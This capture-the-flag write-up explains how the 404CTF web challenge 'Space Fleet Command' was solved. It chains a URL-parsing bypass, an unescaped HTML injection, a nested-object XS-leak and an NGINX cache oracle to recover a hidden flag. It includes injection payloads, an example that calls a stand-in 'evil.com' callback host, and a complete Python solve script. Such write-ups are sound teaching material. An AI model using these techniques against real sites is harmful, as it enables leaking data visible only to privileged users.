# Space Fleet Command - Writeup

## Meta

- **Category:** Web
- **Difficulty:** Hard
- **Number of solves:** 27

### Challenge description

> Le site *Space Fleet Command* permet d'obtenir des informations sur les vaisseaux spatiaux de la flotte du commandement spatial. Les vaisseaux encore classifiés ne sont visibles que par les personnes accréditées - encore heureux, étant donné que l'un de ces vaisseaux a un flag comme nom...  
> Le flag est au format `404CTF{[a-f0-9]{16}}`.

## Challenge overview

### First impressions

The challenge is a simple web application with a listing of spaceships as the home page, which includes a search bar. The user can click on a spaceship to view its details. Finally, there is a page to report a page to the website administrators in case of incorrect information.  
The flag is the name of a classified spaceship, which is only visible to users with a secret admin cookie.
Reporting a page simulates an admin visit to the specified URL, by spawning a chrome instance via *puppeteer* and navigating to the URL, **with the admin cookie set**.

### Technical overview

The challenge is composed of two components :
* A **express** server, which renders the webapp pages with **ejs** and handles the requests.
* A **NGINX** reverse proxy, which sits in front of the express server and **seems to cache the static font assets**.

### Security measures

* The express server, and its dependencies are up-to-date and do not have any known vulnerabilities (at the time of writing !)
* The admin cookie verification seems to be handled well, and there are no obvious ways to leak it or view classified spaceships without it.
* The NGINX reverse proxy configuration doesn't present any obvious security issues, and only the requests with a target matching a strict regex (`^/fonts/[a-zA-Z\-]+\.ttf$`) are cached.
* The express server enforces a strict Content Security Policy (CSP) on all pages : `default-src 'self'; script-src 'none';`
    * The first directive tells the browser that no resource with an external origin should be loaded
    * The second directive tells the browser that no script should be executed on the page.
* When an url is reported, only the path is extracted like so and appended to the base URL of the website (`https://website.404ctf.fr`) :
```javascript
function extractPath(urlString) {
    try {
        const parsedUrl = url.parse(urlString); //who cares about deprecation anyway
        if (!(parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:')) {
            return null;
        } 
        // i've had problems with this check using a reverse proxy - we dont really need it anyway since we only extract the path ¯\_(ツ)_/¯
        // if (parsedUrl.hostname !== 'website.404ctf.fr') {
        //     return null;
        // }
        return parsedUrl.path;
    }
    catch (error) {
        return null;
    }
}
```

```javascript
const page = await browser.newPage();
await browser.setCookie({
  name: "token",
  value: token,
  domain: challenge_host,
});
await page.goto(`http://${challenge_host}${path}`, {
  waitUntil: "networkidle0",
  timeout: 4000,
});
await page.close();
```

## Exploitation

### The entrypoint : exploiting the URL parsing mechanism

This seems to be a client-side side web challenge, and in this case the a first step would be to try to take the bot to a web page we control to gain more leeway. A well-known trick when trying to bypass URL validation is to use the `@` character which ends the `auth` part of the URL.  
We have to fullfill two conditions to achieve this :
* The `path` of the the parsed URL should begin with `@`
* The `scheme` of the URL should be `http` or `https`

The URL is parsed with the `url.parse` function, which is deprecated and can give unexpected results with malformed URLs. By playing with it, we discover that a string in the form of `http:@example.com` is parsed without any error (???) while being severely malformed, and that the `path` of the parsed URL is `@example.com`, and the `scheme` is `http`.

When reporting it, the bot will navigate to `http://spacefleetcommand.404ctf.fr@example.com`, which will lead the bot to the `example.com` website.

### HTML injection and XSLeaks

#### CSP and HTML injection

Now that we can make the bot visit any page we want, what do we do?  
The express server presents an obvious vulnerability, which can be spotted by looking at the code of the `/report` POST route : in case of failure, the URL is rendered in the error message with a `<%->` tag which means **no HTML escaping** :  

```javascript
return res.render('pages/report', { message: `The URL <i>${url}</i> is not valid.` });
```

```HTML
<% if (message) { %>
  <div class="message">
    <%- message %>
  </div>
<% } %>
```

An immediate reflex would be to try to use that to get an XSS and exfiltrate the admin cookie. **BUT** the CSP prevents us from executing any javascript which means we only have **an HTML injection**.  
While this makes it difficult to exfiltrate the admin cookie, an HTML injection can still be used to leak information contained in the page or on the site by using side channel tricks, which are known as [XSLeaks](https://xsleaks.dev/).

#### XSLeaks and SameSite restrictions

We can serve any page we want without restriction to the bot from our server, and it has the admin cookie which allows it to view classified spaceships. Furthermore, the `index` route of the express server **leaks information** via the search function : **if a spaceship with a name beginning with the search query exists, it responds with a 200 status code, otherwise with a 404 status code.**

```javascript
res.status(filteredShips.length ? 200 : 404).render('pages/index', { spaceships: filteredShips, query: query });
```

This seems like a perfect setup for a XSLeak, especially [since status codes are known to be "leaky"](https://xsleaks.dev/docs/attacks/error-events/) : they cause events that can be observed by cross-origin pages. However, the attack described in the previous link wouldn't work here because of the SameSite attribute of the admin cookie.  

By default with Chrome (and other major browsers), cookies are set with `SameSite=Lax`, which means that they are not sent with requests originating from a different site except for top-level navigations (see [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) for more details). It means that if we make the bot query the `/index` route from our webpage, the admin cookie won't be sent and there will be nothing to leak.

What do we do now? We use google :\)  
Searching for *"SameSite XSLeak"* quickly leads us to [this blogpost by zeyu2001](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks), which reveals a method to combine turn an HTML injection into a XSLeak by using the HTML `<object>` tag. In short, when two objects are nested the inner one will only be loaded if the loading of the outer one results in a `404` response. If the source of the inner one is a webhook we control, we can observe the request and thus leak the status code of the outer one!

A quick example, adapted from the blogpost, would be :

```html
<object data="/?q=404CTF{a">
    <object data="https://evil.com?callback=test"></object>
</object>
```

Here we have what's called an **oracle** : if at least one spaceship with a name beginning with `404CTF{a` exists, the browser of the victim will request our callback URL which we'll be able to observe and deduce information from it.

Except... it's not that simple. The CSP also applies to the `<object>` tag, so if the inner object has a foreign origin (which is the case of the example above), it will never be loaded. The previous blogpost presents an alternative solution with `<img>` tags and lazy-loading, but the CSP also applies to images, so we can't use that either.

### How to exfiltrate ?? By not doing it and downgrading to a SSLeak!

The CSP directive seems to be pretty much bulletproof and prevent any kind of exfiltration. But what if we didn't exfiltrate the results of our oracle, and tried to store them somewhere on the website and retrieved them ourselves?  
The express server doesn't present any non-idempotent GET routes, but the express server is not the only component of the challenge... There is also the NGINX reverse proxy, with its caching mechanism!
Let's take a look at its configuration :

```nginx
location ~ ^/fonts/[a-zA-Z\-]+\.ttf$ {
    proxy_cache my_cache;
    proxy_cache_valid 200 1m;
    proxy_pass http://${BACKEND_HOST}:${BACKEND_PORT};
    proxy_set_header Host $http_host;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_http_version 1.1;
    add_header X-Cache-Status $upstream_cache_status;
}
```

The directive `add_header X-Cache-Status $upstream_cache_status;` leaks if the response comes from the cache or not. Furthermore, by default, NGINX uses a hash of `$scheme$proxy_host$request_uri;` (see [this](https://blog.nginx.org/blog/nginx-caching-guide)) as the cache key, which means that we can cache the same resource several times by appending a query string to the URL ! Concretely, by default even if `/fonts/Orbitron-Regular.ttf?foo=bar` is cached default NGINX will not serve the cached response for `/fonts/Orbitron-Regular.ttf?foo=baz`, which means that we can use the query string to store information and use the cache status as our oracle ! We just need to use this as the source of the fallback object, and check ourselves if the response is cached or not to deduce if the bot loaded it.


## Recap

We will get the flag enumerating it character by character (and we known it is of the form `404CTF{[a-f0-9]{16}}`), by using the following steps for each character :
1. We send the bot to a page we control using the `http:@attacker.com` trick
2. We make it submit a HTML form automatically with some JavaScript to make it perform a POST to `/report` with an incorrect URL which will contain our HTML injection payload. Since the POST request originates from a HTML form, the SOP (Same Origin Policy) doesn't apply and we won't be bothered by CORS issues.
3. The payload will contain something like the following;
```html
<object data='//spacefleetcommand.404ctf.fr/?q=404CTF{a'>
    <object data='//spacefleetcommand.404ctf.fr/fonts/Orbitron-Regular.ttf?foo=8384fc1c-d5e0-460f-9952-a6271c30492b'></object>
</object>
```
4. We visit `/fonts/Orbitron-Regular.ttf?foo=8384fc1c-d5e0-460f-9952-a6271c30492b` - if it is not cached, it means that a spaceship with a name beginning with `404CTF{a` exists, otherwise it doesn't.

## Example solve script

Run `python3 -m http.server` in the same directory where you execute the script below :
```python
import requests
from uuid import uuid4

ATTACKER_SERVER = "XXX.XXX.XXX.XXX:8000" # the public and port of your server
REMOTE_HOST = "spacefleetcommand.404ctf.fr"

def update_page(path_to_query,callback_path):
    page = f"""
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Auto Report</title>
    </head>

    <body>

    <form id="autoReportForm" action="http://{REMOTE_HOST}/report" method="POST">
        <input type="hidden" name="url"
        value="</i><object data='//{REMOTE_HOST}{path_to_query}'><object data='//{REMOTE_HOST}{callback_path}'></object></object>">
        <input type="hidden" name="issue" value="Example issue for auto-report">
    </form>

    <script>
        document.getElementById('autoReportForm').submit();
    </script>
    </body>

    </html>
    """
    with open("index.html", "w") as file:
        file.write(page)

def send_bot(path_to_query, callback_path):

    update_page(path_to_query, callback_path)
    data = {
        'url': f"http:@{ATTACKER_SERVER}",
        'issue': ''
    }

    requests.post(f"http://{REMOTE_HOST}/report", data=data)

def was_callback_visited(callback_path):
    response = requests.get(f"http://{REMOTE_HOST}{callback_path}")
    if response.headers.get("X-Cache-Status", "") == "HIT":
        return True
    return False

if __name__ == "__main__":

    flag= "404CTF{"
    for i in range(16):
        for char in "abcdef0123456789":
            path_to_query = "/?q=" + flag + char
            callback_path = f"/fonts/Orbitron-Regular.ttf?callback={uuid4()}"
            send_bot(path_to_query, callback_path)
            if not was_callback_visited(callback_path):
                flag += char
                print(f"Found char: {char} (flag so far: {flag})")
                break
    flag += "}"
    print(f"Flag found: {flag}")
```

## Flag

`404CTF{a24beb7d0b425ee7}`